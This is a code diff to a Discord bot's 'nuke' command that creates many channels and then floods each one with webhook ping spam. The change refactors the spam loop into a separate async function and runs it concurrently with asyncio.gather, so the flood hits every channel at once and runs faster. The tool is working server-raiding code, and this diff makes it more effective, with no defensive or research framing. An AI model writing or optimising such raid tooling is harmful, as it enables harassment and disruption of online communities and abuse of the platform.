@@ -22,6 +22,16 @@ bot = commands.Bot(command_prefix=prefix, intents=intents)
 async def on_ready():
     print(f"✅ {bot.user} is online and ready.")
 
+async def spam_webhook(webhook):
+    for ping_count in range(pings_per_channel):
+        try:
+            await webhook.send(spam_message, username=webhook_name, avatar_url=webhook_pfp)
+            if (ping_count + 1) % 10 == 0:
+                print(f"Sent {ping_count + 1} pings in webhook {webhook.name}")
+            await asyncio.sleep(0.1)  # delay between pings
+        except Exception as e:
+            print(f"❌ Webhook send failed: {e}")
+
 @bot.command()
 async def nuke(ctx):
     await ctx.message.delete()
@@ -76,22 +86,20 @@ async def nuke(ctx):
         except Exception as e:
             print(f"❌ Failed to create channel {i}: {e}")
 
-    # Step 2: Create webhooks and spam pings in each channel
-    print(f"Starting spam: sending {pings_per_channel} pings per channel...")
+    # Step 2: Create webhooks and spam concurrently
+    print(f"Starting spam: sending {pings_per_channel} pings per channel concurrently...")
+    webhook_tasks = []
+
     for channel in created_channels:
         try:
             webhook = await channel.create_webhook(name=webhook_name)
             print(f"Created webhook in {channel.name}")
-            for ping_count in range(pings_per_channel):
-                try:
-                    await webhook.send(spam_message, username=webhook_name, avatar_url=webhook_pfp)
-                    if (ping_count + 1) % 10 == 0:
-                        print(f"Sent {ping_count + 1} pings in {channel.name}")
-                    await asyncio.sleep(0.1)  # Keep ping delay fast
-                except Exception as e:
-                    print(f"❌ Webhook send failed in {channel.name} at ping {ping_count + 1}: {e}")
+            webhook_tasks.append(spam_webhook(webhook))
         except Exception as e:
-            print(f"❌ Failed to create webhook/spam in channel {channel.name}: {e}")
+            print(f"❌ Failed to create webhook in channel {channel.name}: {e}")
+
+    # Run all spam tasks concurrently
+    await asyncio.gather(*webhook_tasks)
 
     print("✅ NUKE complete.")
 
